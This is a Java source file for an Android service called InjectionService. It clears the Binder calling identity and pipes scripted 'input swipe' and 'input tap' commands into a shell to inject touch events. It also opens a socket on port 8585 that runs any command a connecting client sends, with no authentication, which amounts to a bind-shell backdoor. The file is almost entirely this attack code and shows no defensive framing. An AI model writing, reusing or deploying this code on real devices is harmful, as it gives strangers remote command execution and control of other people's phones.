package com.example.injectionservice;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.ServerSocket;
import java.net.Socket;
import android.app.IntentService;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Binder;

public class InjectionService extends IntentService
{

	private static final int PORT = 8585;
	private static Socket s;

	public InjectionService()
	{
		super(".InjectionService");
	}

	@Override
	protected void onHandleIntent(Intent intent)
	{
		log(getPackageManager());
		Binder.clearCallingIdentity();
		log(getPackageManager());

		try
		{
			Thread.sleep(5000);
		}
		catch (InterruptedException e)
		{
			e.printStackTrace();
		}
	}

	private static void log(PackageManager pm)
	{
		// int callingUid = Binder.getCallingUid();
		// Log.i("----",
		// "----"+Binder.getCallingUserHandle()+" "+callingUid+"="+(pm==null?"":pm.getNameForUid(callingUid))+" "+Binder.getCallingPid());
		try
		{
			Process exec = Runtime.getRuntime().exec("sh");
			final BufferedReader br = new BufferedReader(new InputStreamReader(
					exec.getInputStream()));
			BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(
					exec.getOutputStream()));
			final BufferedReader br1 = new BufferedReader(
					new InputStreamReader(exec.getErrorStream()));

			// Log.i("----", "----"+readLine);
			new Thread(new Runnable()
			{

				@Override
				public void run()
				{
					String readLine = null;
					try
					{
						do
						{
							readLine = br.readLine();
							System.out.println(readLine);
						}
						while (readLine != null);
					}
					catch (IOException e)
					{
						e.printStackTrace();
					}
				}
			}).start();
			new Thread(new Runnable()
			{

				@Override
				public void run()
				{
					String readLine = null;
					try
					{
						do
						{
							readLine = br1.readLine();
							System.out.println(readLine);
						}
						while (readLine != null);
					}
					catch (IOException e)
					{
						e.printStackTrace();
					}
				}
			}).start();

			write(bw, "id");

			write(bw, "input swipe 100 100 800 100");
			Thread.sleep(1000);
			write(bw, "input swipe 100 100 800 100");
			Thread.sleep(1000);
			write(bw, "input swipe 100 100 800 100");
			Thread.sleep(1000);
			write(bw, "input tap 1000 1000");

			write(bw, "exit");
		}
		catch (IOException e)
		{
			e.printStackTrace();
		}
		catch (InterruptedException e)
		{
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	public static void logError(Exception e)
	{
		System.out.println("Error " + e.getMessage());
	}

	public static void readFromProcess(final BufferedReader br ,final BufferedReader br1)
	{
		new Thread(new Runnable()
		{

			@Override
			public void run()
			{
				String readLine = null;
				try
				{
					do
					{
						readLine = br.readLine();
						System.out.println(readLine);
					}
					while (readLine != null);
				}
				catch (IOException e)
				{
					e.printStackTrace();
				}
			}
		}).start();
		new Thread(new Runnable()
		{

			@Override
			public void run()
			{
				String readLine = null;
				try
				{
					do
					{
						readLine = br1.readLine();
						System.out.println(readLine);
					}
					while (readLine != null);
				}
				catch (IOException e)
				{
					e.printStackTrace();
				}
			}
		}).start();
	}
	
	private static void write(BufferedWriter bw, String string)
			throws IOException
	{
		bw.write(string + "\n");
		bw.flush();
	}

	// ----------------------------------

	private static void launchServerSocketThread() throws IOException
	{
		final ServerSocket ss = new ServerSocket(PORT);
		while (true)
		{
			s = ss.accept();
			
			System.out.println("New client ! ");
			
			if (s != null && !ss.isClosed())
			{
				final BufferedReader socketReader = new BufferedReader(
						new InputStreamReader(s.getInputStream()));

				Thread t = new Thread()
				{
					public void run()
					{
						while (true)
						{
							try
							{
								Process exec = Runtime.getRuntime().exec("sh");
								
								// Read
								final BufferedReader br = new BufferedReader(new InputStreamReader(
										exec.getInputStream()));
								final BufferedReader br1 = new BufferedReader(
										new InputStreamReader(exec.getErrorStream()));
								readFromProcess(br, br1);
								
								// Write
								BufferedWriter bw = new BufferedWriter(
										new OutputStreamWriter(
												exec.getOutputStream()));
								
								String cmd = socketReader.readLine();
								
								write(bw, cmd);
							}
							catch (Exception e)
							{
								logError(e);
							}
						}
					}
				};
				t.start();
			}
		}
	}
	
	// ----------------------------------

	public static void main(String[] args)
	{
		System.out.println("Hello World");
		// log(null);

		try
		{
			launchServerSocketThread();
		}
		catch (IOException e)
		{
			logError(e);
		}

	}

	// -----------------------------------------------
}
